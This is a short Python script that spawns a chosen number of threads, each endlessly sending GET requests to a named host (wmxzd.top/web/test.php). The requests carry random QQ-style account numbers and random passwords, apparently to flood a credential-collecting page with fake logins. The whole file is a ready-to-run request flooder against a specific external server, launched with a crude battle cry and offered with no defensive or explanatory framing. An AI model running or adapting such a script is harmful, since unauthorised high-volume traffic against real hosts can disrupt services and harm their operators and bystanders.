## http://wmxzd.top/web/test.php
#coding=utf-8
import requests,time,threading
from random import randint
class th(threading.Thread):
    def __init__(self,id):
        threading.Thread.__init__(self)
        self.id=id
        return
    def run(self):
        while True:
            qq=randint(59589458,3655214484)
            pswd=''
            for i in range(10):
                pswd+=chr(randint(48,122))
            addr='http://wmxzd.top/web/test.php?u=%d&p=%s&bianhao=1'%(qq,pswd)
            re=requests.get(addr)
            #print('[%d] %d %s'%(self.id,qq,pswd))
            print(re)
            time.sleep(0.05)
        return
    pass

print("Input threads:")
n=int(input())
print("Fu3k 1t!")
for i in range(n):
    thr=th(i)
    thr.start()
